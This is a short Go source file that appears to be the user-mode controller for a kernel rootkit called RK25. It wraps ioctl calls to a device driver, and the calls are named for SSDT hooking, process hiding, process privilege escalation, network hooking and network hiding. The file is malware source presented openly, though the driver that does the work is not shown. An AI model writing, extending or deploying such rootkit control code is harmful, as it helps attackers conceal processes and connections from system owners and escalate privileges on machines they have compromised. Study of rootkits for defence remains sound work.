package commander

import "rk25_mng/manager/commander/ioctl"

type Commander struct {
	device string
	buff   ioctl.RK25IoctlBuffer
}

func NewCommander(device string) *Commander {
	return &Commander{device: device}
}

func (c *Commander) Test() error {
	testStr := "Hello, RK25_TEST!\000"
	return ioctl.InvokeIoctl(
		c.device,
		ioctl.IOCTL_RK25_TEST_BUFFERED,
		[]byte(testStr),
		ioctl.RK25Action(len(testStr)+1),
	)
}

// func (c *Commander) BufferPreprocessing()

func (c *Commander) ProcHook(buffer []byte, action ioctl.RK25Action) error {
	return c.Invoke(buffer, action, ioctl.IOCTL_RK25_HOOK_SSDT_QUERY)
}

func (c *Commander) ProcHide(buffer []byte, action ioctl.RK25Action) error {
	return c.Invoke(buffer, action, ioctl.IOCTL_RK25_PROC_HIDE)
}

func (c *Commander) ProcPriv(buffer []byte, action ioctl.RK25Action) error {
	return c.Invoke(buffer, action, ioctl.IOCTL_RK25_PROC_PRIV)
}

func (c *Commander) NetHook(buffer []byte, action ioctl.RK25Action) error {
	return c.Invoke(buffer, action, ioctl.IOCTL_RK25_HOOK_NET)
}

func (c *Commander) NetHide(buffer []byte, action ioctl.RK25Action) error {
	return c.Invoke(buffer, action, ioctl.IOCTL_RK25_NET_HIDE)
}

func (c *Commander) Invoke(buffer []byte, action ioctl.RK25Action, code ioctl.RK25IoctlCode) error {
	return ioctl.InvokeIoctl(
		c.device,
		code,
		buffer,
		action,
	)
}
